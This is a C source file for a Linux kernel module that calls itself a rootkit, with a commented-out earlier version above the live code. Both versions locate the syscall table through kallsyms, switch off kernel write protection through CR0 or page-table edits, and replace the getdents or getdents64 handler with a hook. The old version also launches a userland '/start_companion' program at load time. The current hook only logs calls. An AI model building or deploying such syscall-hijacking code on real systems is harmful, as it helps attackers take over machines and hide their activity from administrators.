//#include <linux/init.h>
//#include <linux/module.h>
//#include <linux/syscalls.h>
//#include <linux/kernel.h>
//#include <linux/kallsyms.h>
//#include <asm/unistd.h>
//#include <linux/smp.h>
//#include <linux/preempt.h>
//
//static unsigned long *sys_call_table = NULL;
//static asmlinkage long (*original_call)(const struct pt_regs *);

//static asmlinkage long myGetDents(const struct pt_regs *regs) {
//    long ret = original_call(regs);
//    printk(KERN_INFO "Syscall was called\n");
//    return ret;
//}
//
//static unsigned long orig_cr0;
//
//static inline void unprotect_memory(void) {
//    unsigned long cr0;
//    preempt_disable();        // Disable preemption
//    barrier();                // Memory barrier
//    cr0 = read_cr0();
//    orig_cr0 = cr0;
//    cr0 &= ~X86_CR0_WP;      // Clear WP bit
//    barrier();                // Memory barrier
//    write_cr0(cr0);
//    barrier();                // Memory barrier
//}
//
//static inline void protect_memory(void) {
//    barrier();                // Memory barrier
//    write_cr0(orig_cr0);
//    barrier();                // Memory barrier
//    preempt_enable();         // Re-enable preemption
//}
//
///* Current solution would be to allow kallsyms_lookup_name in our Kernel, for the moment, and they maybe disable it and see how we can still have the same behavior
// *
// *  https://infosecwriteups.com/linux-kernel-module-rootkit-syscall-table-hijacking-8f1bc0bd099c
// * */
//
//static unsigned long **find_sys_call_table(void) {
//    return (unsigned long **)kallsyms_lookup_name("sys_call_table");
//}
////static unsigned long **find_sys_call_table(void) {
////    unsigned long offset = PAGE_OFFSET;
////    unsigned long **sct;
////
////    while (offset < ULLONG_MAX) {
////        sct = (unsigned long **)offset;
////        if (sct[__NR_close] == (unsigned long ) sys_close) 
////            return sct;
////        offset += sizeof(void *);
////    }
////    return NULL;
////}
////
//
//
//static int hooking_syscall(void *hook_addr, uint16_t syscall_offset, unsigned long *sys_call_table)
//{
//    if (!hook_addr || !sys_call_table)
//        return -EINVAL;
//
//    printk(KERN_INFO "Attempting to hook syscall at offset %d\n", syscall_offset);
//    printk(KERN_INFO "Original address: %px\n", (void*)sys_call_table[syscall_offset]);
//    
//    unprotect_memory();
//    sys_call_table[syscall_offset] = (unsigned long)hook_addr;
//    protect_memory();
//    
//    printk(KERN_INFO "New address: %px\n", (void*)sys_call_table[syscall_offset]);
//    return 0;
//}
//
//static void unhooking_syscall(void *orig_addr, uint16_t syscall_offset)
//{
//	unprotect_memory();
//	sys_call_table[syscall_offset] = (unsigned long)orig_addr;
//	protect_memory();
//}
//
//static int __init rootkit_init(void) {
//
//    int ret;
//    
//    sys_call_table = (unsigned long*)find_sys_call_table();
//    if (!sys_call_table) {
//        printk(KERN_ERR "Failed to find syscall table\n");
//        return -EFAULT;
//    }
//
//    original_call = (void *)sys_call_table[__NR_getdents];
//    if (!original_call) {
//        printk(KERN_ERR "Failed to save original syscall\n");
//        return -EFAULT;
//    }
//
//
//    ret = hooking_syscall(myGetDents, __NR_getdents, sys_call_table);
//    if (ret < 0) {
//        printk(KERN_ERR "Failed to hook syscall\n");
//        return ret;
//    }
//    printk(KERN_INFO "Rootkit has been loaded\n");
//    char *argv[] = {"/start_companion", NULL};
//    char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
//
//    int r = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
//    printk("%i\n", r);
//    return 0;
//}
//
//static void rootkit_exit(void) {
//    unhooking_syscall(original_call, __NR_getdents);
//    printk(KERN_INFO "Rootkit has been unloaded\n");
//}
//
//module_init(rootkit_init);
//module_exit(rootkit_exit);
//
//MODULE_LICENSE("GPL");
#include <linux/init.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <asm/unistd.h>
#include <linux/smp.h>
#include <linux/preempt.h>
#include <linux/vmalloc.h>
#include <linux/ftrace.h>

#pragma GCC optimize("-fno-optimize-sibling-calls")

/* We pack all the information we need (name, hooking function, original function)
 * into this struct. This makes is easier for setting up the hook and just passing
 * the entire struct off to fh_install_hook() later on.
 * */
struct ftrace_hook {
    const char *name;
    void *function;
    void *original;

    unsigned long address;
//    struct ftrace_ops ops;
};

static unsigned long *sys_call_table = NULL;
static asmlinkage long (*original_call)(const struct pt_regs *);

static asmlinkage long myGetDents(const struct pt_regs *regs) {
//    struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->di;
    long ret = original_call(regs);
    printk(KERN_INFO "Syscall was called\n");
    return ret;
}

static inline void write_cr0_force(unsigned long val) {
    asm volatile("mov %0,%%cr0": "+r" (val) : : "memory");
}

static inline void protect_memory(void) {
    write_cr0_force(read_cr0() | (1 << 16));
}

static inline void unprotect_memory(void) {
    write_cr0_force(read_cr0() & (~(1 << 16)));
}

static int make_rw(unsigned long address) {
    unsigned int level;
    pte_t *pte = lookup_address(address, &level);
    if (pte == NULL) 
        return -1;
    if (pte->pte & ~_PAGE_RW) 
        pte->pte |= _PAGE_RW;
    return 0;
}

static int make_ro(unsigned long address) {
    unsigned int level;
    pte_t *pte = lookup_address(address, &level);
    if (pte == NULL)
        return -1;
    pte->pte = pte->pte & ~_PAGE_RW;
    return 0;
}

static void hooking_syscall(void *hook_addr, uint16_t syscall_offset)
{
    printk(KERN_INFO "Attempting to hook syscall at offset %d\n", syscall_offset);
    printk(KERN_INFO "Original address: %px\n", ((void *)sys_call_table[syscall_offset]));
    
    make_rw((unsigned long)sys_call_table);
    sys_call_table[syscall_offset] = (unsigned long)hook_addr;
    make_ro((unsigned long)sys_call_table);
    
    printk(KERN_INFO "New address: %px\n", ((void *)sys_call_table[syscall_offset]));
}

static void unhooking_syscall(void *orig_addr, uint16_t syscall_offset)
{
    make_rw((unsigned long)sys_call_table);
    sys_call_table[syscall_offset] = (unsigned long)orig_addr;
    make_ro((unsigned long)sys_call_table);
}

static unsigned long **find_sys_call_table(void) {
    return (unsigned long **)kallsyms_lookup_name("sys_call_table");
}

static int __init rootkit_init(void) {
    printk(KERN_INFO "Bruh\n");
    
    sys_call_table = (unsigned long*)find_sys_call_table();
    if (!sys_call_table) {
        printk(KERN_ERR "Failed to find syscall table\n");
        return -1;
    }

    original_call = (void *)sys_call_table[__NR_getdents64];
    hooking_syscall(myGetDents, __NR_getdents64);
    printk(KERN_INFO "addr %px\n",myGetDents);
    printk(KERN_INFO "Rootkit has been loaded\n");
    return 0;
}

static void __exit rootkit_exit(void) {
    unhooking_syscall(original_call, __NR_getdents64);
    printk(KERN_INFO "Rootkit has been unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
MODULE_LICENSE("GPL");
